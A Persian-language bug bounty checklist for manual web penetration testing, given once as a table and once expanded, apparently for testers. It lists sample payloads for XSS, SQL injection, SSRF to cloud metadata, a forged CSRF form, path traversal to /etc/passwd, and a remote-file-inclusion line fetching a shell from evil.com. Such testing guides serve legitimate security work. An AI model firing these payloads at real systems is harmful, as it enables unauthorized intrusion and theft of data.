# 🛡️ چک‌لیست دستی تست نفوذ وب (Bug Bounty)

| بخش | تست‌ها و موارد دستی |
|------|----------------------|
| **1. Recon (جمع‌آوری اطلاعات)** | - Subdomain: `assetfinder`, `amass`, `subfinder` <br> - مسیر مخفی: `gau`, `waybackurls`, `ffuf` <br> - فایل‌های حساس: `/.git/`, `/config.php`, `/backup.zip` |
| **2. Authentication & Session** | - Login بدون پسورد <br> - Reset Password → تغییر Token به ایمیل قربانی <br> - بررسی Secure/HttpOnly کوکی <br> - Session Fixation: تغییر SessionID |
| **3. Authorization (IDOR / BOLA)** | - تغییر `id=123` → `id=124` <br> - تست API با تغییر یا حذف JWT Claim <br> - حذف فیلد حساس در درخواست |
| **4. Business Logic Flaws** | - خرید با قیمت منفی/صفر <br> - استفاده چندباره از کوپن <br> - Skip مرحله پرداخت (`/success`) <br> - تغییر نقش کاربر |
| **5. XSS (Cross-Site Scripting)** | - ورودی در فرم‌ها، GET/POST، هدرها <br> - Payload: `"><svg onload=alert(1)>` <br> - تست DOM-XSS: `document.write`, `innerHTML` |
| **6. CSRF (Cross-Site Request Forgery)** | - فرم جعلی با `POST /change-email` <br> - بررسی درخواست بدون CSRF Token |
| **7. File Upload** | - آپلود `shell.php.jpg` <br> - تغییر Content-Type به `image/jpeg` <br> - اجرای فایل در `/uploads/` |
| **8. SQL Injection** | - اضافه `'` یا `--` به پارامتر <br> - Boolean: `id=1 AND 1=1` vs `id=1 AND 1=2` <br> - Union: `id=1 UNION SELECT null,null,null` |
| **9. SSRF (Server Side Request Forgery)** | - تست پارامتر `url` یا `redirect` <br> - دسترسی به: `127.0.0.1`, `169.254.169.254` <br> - تست با Burp Collaborator / interactsh |
| **10. Open Redirect** | - `/login?redirect=https://evil.com` |
| **11. LFI/RFI (File Inclusion)** | - `page=../../../../etc/passwd` <br> - `page=http://evil.com/shell.txt` |
| **12. Race Condition** | - ارسال همزمان چند درخواست (Burp Intruder) <br> - استفاده دوباره از کوپن تخفیف |
| **13. Header Injection / Misconfig** | - تغییر `Host: evil.com` <br> - تست `X-Forwarded-For: 127.0.0.1` <br> - بررسی CSP, HSTS, X-Frame-Options |

---

## ✅ نکات پایانی
- تست‌ها رو مرحله‌ای انجام بده و مستند کن.  
- هر Payload موفق = ثبت کامل Request + Response.  
- حتماً قبل تست قوانین برنامه باگ‌بانتی رو بخون.




======================================================================
# 🛡️ چک‌لیست دستی تست نفوذ وب (Bug Bounty)

## 🔹 1. جمع‌آوری اطلاعات (Recon)
- پیدا کردن Subdomainها  
  - `assetfinder`, `amass`, `subfinder`, `crt.sh`
- پیدا کردن مسیرهای مخفی  
  - `gau`, `waybackurls`, `ffuf`, `gobuster`
- بررسی فایل‌های حساس  
  - `/.git/`, `/config.php`, `/backup.zip`

## 🔹 2. تست Authentication و Session
- **Login / Logout / Reset Password**
  - تست Login بدون پسورد
  - تست Reset Password → تغییر Token به ایمیل قربانی
- **Session Management**
  - کوکی Secure/HttpOnly بررسی بشه
  - تست Fixation: تغییر SessionID قبل و بعد از لاگین

## 🔹 3. تست Authorization (IDOR / BOLA)
- تغییر IDها:
  ```
  GET /user/123  → تغییر به 124
  ```
- تست روی API (REST/GraphQL):
  - حذف یا تغییر JWT Claim (`"role": "admin"`)
  - حذف فیلدهای حساس در درخواست و دیدن رفتار

## 🔹 4. Business Logic Flaws
- تست خرید با قیمت منفی یا صفر  
- تست چند بار استفاده از کوپن  
- تست Skip مرحله پرداخت با تغییر Flow (مثلا رفتن مستقیم به /success)  
- تست تغییر نقش کاربر با پارامترها  

## 🔹 5. XSS (Cross-Site Scripting)
- تست ورودی در: فرم‌ها، پارامتر GET/POST، هدرها
- نمونه Payload ساده:
  ```html
  "><svg onload=alert(1)>
  ```
- تست DOM-XSS در فایل‌های JS:
  - سرچ `document.write`, `innerHTML`, `location.hash`

## 🔹 6. CSRF (Cross-Site Request Forgery)
- ساخت فرم جعلی:
  ```html
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@test.com">
    <input type="submit">
  </form>
  ```
- بررسی: آیا درخواست بدون CSRF Token هم قبول میشه؟

## 🔹 7. File Upload
- تست آپلود فایل:  
  - `shell.php.jpg`  
  - تغییر Content-Type: `image/jpeg` → ولی فایل PHP باشه  
- تست اجرای فایل در `/uploads/`

## 🔹 8. SQL Injection (دستی)
- اضافه کردن `'` یا `--` به پارامترها
- تست Boolean-based:
  ```
  id=1 AND 1=1
  id=1 AND 1=2
  ```
- تست Union:
  ```
  id=1 UNION SELECT null,null,null
  ```

## 🔹 9. SSRF (Server Side Request Forgery)
- پارامترهای `url`, `path`, `redirect`
  ```
  url=http://127.0.0.1:8080/admin
  url=http://169.254.169.254/latest/meta-data/
  ```
- تست DNS Logging (Burp Collaborator / interactsh)

## 🔹 10. Open Redirect
- تغییر:
  ```
  /login?redirect=https://evil.com
  ```

## 🔹 11. LFI/RFI (File Inclusion)
- تست:
  ```
  page=../../../../etc/passwd
  page=http://evil.com/shell.txt
  ```

## 🔹 12. Race Condition
- ارسال همزمان چند درخواست با Burp Intruder / Turbo Intruder  
- مثال: دوبار استفاده از کوپن تخفیف در یک لحظه  

## 🔹 13. Header Injection / Misconfig
- تست هدرها:
  ```
  Host: evil.com
  X-Forwarded-For: 127.0.0.1
  ```
- بررسی هدرهای امنیتی (CSP, X-Frame-Options, HSTS)

---

## ✅ نکات پایانی
- همه تست‌ها رو **مرحله‌ای** انجام بده و یادداشت کن.  
- خروجی هر Payload موفق → گزارش دقیق (Request + Response).  
- همیشه قبل تست → ببین توی برنامه Bug Bounty اون نوع حمله مجازه یا نه.  
